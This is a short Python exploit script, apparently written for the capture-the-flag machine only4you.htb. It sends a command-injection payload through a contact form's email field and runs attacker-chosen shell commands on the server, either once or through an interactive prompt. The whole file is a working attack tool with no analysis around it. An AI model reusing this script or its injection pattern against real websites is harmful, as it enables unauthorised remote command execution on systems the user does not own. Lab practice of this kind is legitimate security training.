#!/usr/bin/env python3
from requests import post, exceptions
from argparse import ArgumentParser
import re

def getArguments():
    parser = ArgumentParser(description="Command injection exploit for only4you.htb")
    parser.add_argument("-c", "--command", required=False, help="Command to execute")
    return parser.parse_args()

def getEmailDomainPayload(command: str):
   return f"a@only4you.htb; {command}; # \nbob@only4you.htb"

def sendForm(email: str):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = {"email": email, "subject": "foo", "message": "bar"}
    post("http://only4you.htb/", headers=headers, data=payload, timeout=10)

def executeCommand(command: str) -> str:
    payload = getEmailDomainPayload(command)
    try:
        sendForm(payload)
    except exceptions.ReadTimeout:
        return "Command execution timed out"
    return "Command executed"

def startInteractiveCommandInjection():
    print("Press Ctrl+C to exit")
    while True:
        command = input("$ ")
        result = executeCommand(command)
        print(result)

def main():
    args = getArguments()

    if args.command:
        result = executeCommand(args.command)
        print(result)
    else:
        try:
            startInteractiveCommandInjection()
        except KeyboardInterrupt:
            pass
        print("\nQuitting..")

if __name__ == "__main__":
    main()
